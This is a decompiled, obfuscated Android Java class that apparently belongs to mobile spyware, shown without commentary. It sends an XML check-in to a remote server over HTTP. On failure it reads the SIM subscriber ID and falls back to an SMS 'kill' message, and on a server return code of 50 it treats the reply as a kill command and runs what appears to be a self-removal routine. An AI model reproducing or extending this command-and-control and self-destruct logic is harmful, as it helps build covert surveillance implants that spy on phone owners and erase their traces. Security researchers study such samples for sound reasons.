package com.network.android.a;

import android.content.Context;
import android.telephony.TelephonyManager;
import android.util.Xml;
import com.network.android.SmsReceiver;
import com.network.android.c.a.a;
import com.network.android.g;
import com.network.android.x;
import com.network.h.b;
import java.io.StringWriter;
import org.xmlpull.v1.XmlSerializer;

final class e implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ long f46a;
    final /* synthetic */ Context b;

    e(long j, Context context) {
        this.f46a = j;
        this.b = context;
    }

    public final void run() {
        try {
            a.a("httpPingKillDelay exce: " + this.f46a);
            XmlSerializer newSerializer = Xml.newSerializer();
            StringWriter stringWriter = new StringWriter();
            Context context = this.b;
            SmsReceiver.a(newSerializer, stringWriter);
            SmsReceiver.a(newSerializer);
            new g();
            x xVar = new x(this.b);
            g.a(SmsReceiver.c(this.b), stringWriter.toString(), xVar, null, null, this.b, null);
            a.a("httpPingKillDelay provHandler.retCode: " + xVar.f132a);
            if (xVar.f132a == 0) {
                a.a("httpPingKillDelay - Succes in send Ping");
                b.a(this.b);
            } else if (xVar.f132a == -1) {
                a.b("sendHttp -  Fail to send Ping: ");
                a.a("kill - no internet!");
                if (((TelephonyManager) this.b.getSystemService("phone")).getSubscriberId() != null) {
                    a.a("ping SMS httpFirstLastPing not on line send sms mo kill");
                    c.b(this.b, 5);
                }
                b.a(this.b);
            } else if (xVar.f132a == 50) {
                a.a("sendHttp -  retCode == 50 !!! kill command !!!: " + xVar.b);
                b.a(this.b);
            } else {
                a.a("httpPingKillDelay - other case");
                if (((TelephonyManager) this.b.getSystemService("phone")).getSubscriberId() != null) {
                    a.a("ping SMS httpFirstLastPing not on line send sms mo kill");
                    c.b(this.b, 5);
                }
                b.a(this.b);
            }
        } catch (Throwable th) {
            a.a("httpPingKillDelay: " + th.getMessage(), th);
        }
    }
}
